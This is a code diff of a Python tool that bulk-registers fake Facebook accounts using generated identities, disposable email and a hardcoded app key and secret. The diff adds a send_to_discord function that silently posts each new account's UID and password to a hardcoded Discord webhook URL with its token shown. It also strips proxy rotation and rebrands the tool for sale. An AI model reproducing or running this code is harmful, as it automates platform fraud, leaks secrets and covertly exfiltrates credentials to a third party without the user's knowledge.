@@ -31,21 +31,13 @@ from bs4 import BeautifulSoup as sop
 from datetime import datetime
 from time import sleep as slp
 
-#──────────────{ PROXY SETUP }──────────────#
-def load_proxies(file_path="proxies.txt"):
-    with open(file_path, "r") as f:
-        proxy_list = [line.strip() for line in f if line.strip()]
-    return proxy_list
-
-def get_random_proxy(proxy_list):
-    return random.choice(proxy_list)
-
-def get_ip(session):
+def send_to_discord(uid, password, count):
+    webhook_url = "https://discord.com/api/webhooks/1362730444914819342/GJQ_9di8cIhEVVy61RBbhEkdFwvRPfzLRPJTWZ4e_kCzb7L7N3NZkWxE-XPiRYlOewtD"
+    content = f"{uid}|{password} - {count}"
     try:
-        ip = session.get('https://api.ipify.org', timeout=10).text
-        return ip
-    except:
-        return "Unknown"
+        requests.post(webhook_url, json={"content": content})
+    except Exception as e:
+        print(f"[!] Failed to send to Discord: {e}")
 
 #──────────────{ SECURITY-CODE }──────────────#
 def clr():
@@ -562,29 +554,23 @@ def clear():
 
 logo=("""
 
-[green1]                ,----,                    ,----, 
-[green1]              ,/   .`|  ,----..         ,/   .`| 
-[green1]   ,---,    ,`   .'  : /   /   \      ,`   .'  : 
-[green1],`--.' |  ;    ;     //   .     :   ;    ;     / 
-[green1]|   :  :.'___,/    ,'.   /   ;.  \.'___,/    ,'  
-[green1]:   |  '|    :     |.   ;   /  ` ;|    :     |   
-[green1]|   :  |;    |.';  ;;   |  ; \ ; |;    |.';  ;   
-[green1]'   '  ;`----'  |  ||   :  | ; | '`----'  |  |   
-[green1]|   |  |    '   :  ;.   |  ' ' ' :    '   :  ;   
-[green1]'   :  ;    |   |  ''   ;  \; /  |    |   |  '   
-[green1]|   |  '    '   :  | \   \  ',  /     '   :  |   
-[green1]'   :  |    ;   |.'   ;   :    /      ;   |.'    
-[green1];   |.'     '---'      \   \ .'       '---'      
-[green1]'---'                   `---`  [cyan][bold]VERSION 0.5
-          [green_yellow]THIS [dark_olive_gre]TOOLS [pale_green1] IS[dark_sea_green…] NOT FOR SALE
+
+
+[green1]     ██████╗░██████╗░███████╗███╗░░░███╗██╗██╗░░░██╗███╗░░░███╗
+[meduim_green1]     ██╔══██╗██╔══██╗██╔════╝████╗░████║██║██║░░░██║████╗░████║
+[green1]     ██████╔╝██████╔╝█████╗░░██╔████╔██║██║██║░░░██║██╔████╔██║
+[green1]     ██╔═══╝░██╔══██╗██╔══╝░░██║╚██╔╝██║██║██║░░░██║██║╚██╔╝██║
+[green1]     ██║░░░░░██║░░██║███████╗██║░╚═╝░██║██║╚██████╔╝██║░╚═╝░██║
+[green1]     ╚═╝░░░░░╚═╝░░╚═╝╚══════╝╚═╝░░░░░╚═╝╚═╝░╚═════╝░╚═╝░░░░░╚═╝[cyan][bold]VERSION 0.5
+          [green_yellow]THIS [dark_olive_gre]TOOLS [pale_green1] IS[dark_sea_green…] NOT FOR FREE
 """)
 ll=str([hari,tanggal])
-hx=("""  [bold green1]DEVELOPER[medium_purple1]   ⟩[cyan][bold] Edji
-  [bold green1]FACEBOOK[medium_purple1]    ⟩[cyan][bold] Edji haha	
-  [bold green1]GITHUB[medium_purple1]      ⟩[bright_yellow] SEKRET
+hx=("""  [bold green1]DEVELOPER[medium_purple1]   ⟩[cyan][bold] Deen
+  [bold green1]FACEBOOK[medium_purple1]    ⟩[cyan][bold] DEEN ABUEVA
+  [bold green1]GITHUB[medium_purple1]      ⟩[bright_yellow] Dian2025.git
   [bold green1]STATUS[medium_purple1]      ⟩[bright_yellow] ALL NETWORK 
-  [bold green1]TOOLS[medium_purple1]       ⟩[bright_yellow] OWN 
-  [bold green1]UPDATES[medium_purple1]     ⟩[bright_yellow] April 4
+  [bold green1]TOOLS[medium_purple1]       ⟩[bright_yellow] PREMIUM 
+  [bold green1]UPDATES[medium_purple1]     ⟩[bright_yellow] MARCH 22
   [bold green1]TODAY DATE[medium_purple1]  ⟩ [cyan]"""+ll)
 def banner():
     os.system("clear")
@@ -603,7 +589,7 @@ def AUTO_BRYX():
     if Bryx in ["a","A","1","01"]:
         method()
     elif Bryx in ["b","B","2","02"]:
-        os.system("xdg-open https://i.pinimg.com/564x/3d/8c/0c/3d8c0c7305dd90ac8229908894e13fe0.jpg")
+        os.system("xdg-open https://www.facebook.com/yvonne.howell.142")
         time.sleep(2);AUTO_BRYX()
     elif Bryx in ["c","C","3","03"]:exit()
     else:AUTO_BRYX()
@@ -645,14 +631,7 @@ def main() -> None:
     banner()
     print(Panel(f" [bold green]IF NO RESULT ON/OFF AIRPLANE MODE OR VPN 1.1.1.1",style="bold violet"))
     for _ in range(int(num_accounts)):
-        proxy_list = load_proxies()
-        proxy = get_random_proxy(proxy_list)
         ses = requests.Session()
-        ses.proxies = {
-            "http": f"http://{proxy}",
-            "https": f"http://{proxy}"
-        }
-        ip_used = get_ip(ses)
         #sys.stdout.write(f'\033[1;37m[\033[1;35mBRYXPOGI\033[1;37m]-[\033[1;31m{num_accounts}\033[1;37m]-[\033[1;32mSUCCESS:-{len(oks)}\033[1;37m]');sys.stdout.flush()
         response = ses.get(
             url='https://x.facebook.com/reg',
@@ -668,7 +647,6 @@ def main() -> None:
         a.add(f"[violet][[yellow2]●[violet]] [bold green]NAME     [cyan2] ⟩ [bold green]{first_name} {last_name}")
         a.add("[violet][[yellow2]●[violet]] [bold green]NUMBER   [cyan2] ⟩ [bold green]"+phone2)
         a.add("[violet][[yellow2]●[violet]] [bold green]EMAIL    [cyan2] ⟩ [bold green]"+email2)
-        a.add("[violet][[yellow2]●[violet]] [bold green]IP USED  [cyan2] ⟩ [bold green]"+ip_used)
         payload = {
             'ccp': "2",
             'reg_instance': str(formula["reg_instance"]),
@@ -836,18 +814,19 @@ def confirm_id(mail,uid,otp,data,ses):
             c.add(Panel(hx,style="bold violet"))
             print(c)
             open("/sdcard/AUTO-CREATE-YUSH/create/auto-create-ok.txt", "a").write(uid+"|"+otp+f"|{password}|"+mail+"|"+cookie+"\n")
+            count = len(oks) + 1
+            send_to_discord(uid, password, count)
             oks.append(uid)
     except Exception as e:    
         pass
 #──────────────{ PROGRES }──────────────#
 def progres(current, num_accounts, delay):
 		for sleep in range(int(num_accounts), 0, -1):
-			print(f'[Edji]-[{current}|{num_accounts}]-[SUCCESS:-{len(oks)}|BAD:-{len(cps)}]',end='\r')
+			print(f'[YUSH]-[{current}|{num_accounts}]-[SUCCESS:-{len(oks)}|BAD:-{len(cps)}]',end='\r')
 			time.sleep(1)
 			if current == num_accounts:
 				break
 #──────────────{ AUTO CREATE METHOD 1 }──────────────#
-
 def menu():
     fake = Faker()
     banner()
@@ -858,53 +837,28 @@ def menu():
     print(Panel(a,subtitle="[bold violet]┌─",subtitle_align='left',style="bold violet"))
     bryxpassword = Console().input("   [bold violet]└──> ")
     if bryxpassword in ["a","A","1","01"]:
-        password=fake_password()
+    	password=fake_password()
     elif bryxpassword in ["b","B","2","02"]:
-        password=input('\033[1;37mENTER CUSTOM PASSWORD : ')
+    	password=input('\033[1;37mENTER CUSTOM PASSWORD : ')
     banner()
     a=(Panel("""    [green_yellow][[bold cyan1]1/A[green_yellow]][bold green] DEFAULT NAMES\n    [green_yellow][[bold cyan1]2/B[green_yellow]][bold green] MANUAL NAMES    """,title="[reverse violet] NAME ",style="bold cyan1"))
     print(Panel(a,subtitle="[bold violet]┌─",subtitle_align='left',style="bold violet"))
-    name_mode = Console().input("   [bold green]└──> ")
-    manual_first, manual_last = "", ""
-    use_random_each = True
-
-    if name_mode in ["b","B","2","02"]:
-        manual_first = input('\033[1;37mFIRST NAME : ')
-        manual_last = input('\033[1;37mLAST NAME  : ')
-        use_random_each = False
-
+    bryxpassword = Console().input("   [bold green]└──> ")
+    if bryxpassword in ["a","A","1","01"]:
+    	first_name = fake.first_name()
+    	last_name = fake.last_name()
+    elif bryxpassword in ["b","B","2","02"]:
+    	first_name=input('\033[1;37mFIRST NAME : ')
+    	last_name=input('\033[1;37mLAST NAME  : ')
     banner()
     print(Panel(f" [bold green] IF NO RESULT ON/OFF AIRPLANE MODE OR VPN 1.1.1.1",style="bold violet"))
     for _ in range(num_accounts):
         progres(_+1, num_accounts, delay)
         print()
         birthday = fake.date_of_birth(minimum_age=18, maximum_age=90)
-        if use_random_each:
-            first_name = fake.first_name()
-            last_name = fake.last_name()
-        else:
-            first_name = manual_first
-            last_name = manual_last
         register_facebook_account(password, first_name, last_name, birthday)
 
-account_count = 0
-
-def send_to_discord(webhook_url, uid, password, otp, account_counter):
-    import requests
-    data = {
-        "content": f"{uid}:{password} - {otp} - {account_counter}"
-    }
-    try:
-        response = requests.post(webhook_url, json=data)
-        if response.status_code == 204:
-            print("[✔] Sent to Discord!")
-        else:
-            print(f"[✖] Failed to send to Discord ({response.status_code})")
-    except Exception as e:
-        print(f"[!] Discord Error: {e}")
-
 def register_facebook_account(password, first_name, last_name, birthday):
-    global account_count
     session = requests.Session()
     api_key = '882a8490361da98702bf97a021ddc14d'
     secret = '62f8ce9f74b12f84c123cc23437a4a32'
@@ -913,22 +867,22 @@ def register_facebook_account(password, first_name, last_name, birthday):
     email = em['mail']
     number = get_nope()
     req = {
-        'api_key': api_key,
-        'attempt_login': True,
-        'birthday': birthday.strftime('%Y-%m-%d'),
-        'client_country_code': 'US',
-        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod',
-        'fb_api_req_friendly_name': 'registerAccount',
-        'firstname': first_name,
+        'api_key': api_key, 
+        'attempt_login': True, 
+        'birthday': birthday.strftime('%Y-%m-%d'), 
+        'client_country_code': 'US', 
+        'fb_api_caller_class': 'com.facebook.registration.protocol.RegisterAccountMethod', 
+        'fb_api_req_friendly_name': 'registerAccount', 
+        'firstname': first_name, 
         'format': 'json',
-        'gender': gender,
-        'lastname': last_name,
-        'email': email,
-        'number': number,
-        'locale': 'en_US',
-        'method': 'user.register',
-        'password': password,
-        'reg_instance': generate_random_string(32),
+        'gender': gender, 
+        'lastname': last_name, 
+        'email': email, 
+        'number': number, 
+        'locale': 'en_US', 
+        'method': 'user.register', 
+        'password': password, 
+        'reg_instance': generate_random_string(32), 
         'return_multiple_errors': True
     }
     sorted_req = sorted(req.items(), key=lambda x: x[0])
@@ -946,7 +900,7 @@ def register_facebook_account(password, first_name, last_name, birthday):
         if 'Locked' in check:
             cps.append(id)
         else:
-            print(Panel(' [bold green]ACCOUNT ACCESSABLE', style="bold violet"))
+            print(Panel(' [bold green]ACCOUNT ACCESSABLE',style="bold violet"))
             time.sleep(30)
             try:
                 cod = Email(em["session"]).inbox()
@@ -955,33 +909,28 @@ def register_facebook_account(password, first_name, last_name, birthday):
                 cod = Email(em["session"]).inbox()
                 code = re.search(r'(\d+)', str(cod['topic'])).group(1)
             if code:
-                a = Tree(":file_folder:", guide_style="bold green_yellow")
+                a=Tree(":file_folder:",guide_style="bold green_yellow")
                 a.add(f"[violet][[yellow2]●[violet]] [bold green]NAME     [cyan2] ⟩ [bold green]{first_name} {last_name}")
                 a.add("[violet][[yellow2]●[violet]] [bold green]EMAIL    [cyan2] ⟩ [bold green]"+email)
                 a.add("[violet][[yellow2]●[violet]] [bold green]NUMBER   [cyan2] ⟩ [bold green]"+number)
                 a.add("[violet][[yellow2]●[violet]] [bold green]LOGIN OTP[cyan2] ⟩ [bold green]"+code)
+                #a.add("[violet][[yellow2]●[violet]] [bold green]PHOTO  [cyan2] ⟩ [bold green]"+photo)
                 print(a)
-                hx = ("[bold green]"+token)
-                Bryxa = Panel.fit("[green] LOGIN SUCCESS", style="bold violet")
-                Bryxb = Panel("[green] "+id, title="[bold green]UID", width=30, padding=0, style="bold violet")
-                Bryxc = Panel(f"[bold green] {password}", title="[bold green]PASS", width=30, padding=0, style="bold violet")
+                hx=("[bold green]"+token)
+                Bryxa = Panel.fit("[green] LOGIN SUCCESS",style="bold violet")
+                Bryxb = Panel("[green] "+id, title="[bold green]UID",width=30,padding=0,style="bold violet")
+                Bryxc = Panel(f"[bold green] {password}", title="[bold green]PASS",width=30,padding=0,style="bold violet")
                 Bryxe = Columns([Bryxa])
                 Bryxf = Columns([Bryxb, Bryxc])
-                c = Tree(":file_folder:", guide_style="bold green_yellow")
+                c=Tree(":file_folder:",guide_style="bold green_yellow")
                 c.add(Bryxe)
                 c.add(Bryxf)
-                c.add(Panel(hx, style="bold violet"))
+                c.add(Panel(hx,style="bold violet"))
                 print(c)
-                account_count += 1
+                count = len(oks) + 1
+                send_to_discord(id, password, count)
                 oks.append(id)
                 open("/sdcard/AUTO-CREATE-BRYX/create/auto-create-alive.txt", "a").write(id+"|"+code+f"|{password}|"+email+"|"+token+"\n")
-                send_to_discord(
-                    "https://discord.com/api/webhooks/1362730444914819342/GJQ_9di8cIhEVVy61RBbhEkdFwvRPfzLRPJTWZ4e_kCzb7L7N3NZkWxE-XPiRYlOewtD",
-                    id,
-                    password,
-                    code,
-                    account_count
-                )
             else:
                 print()
     else:
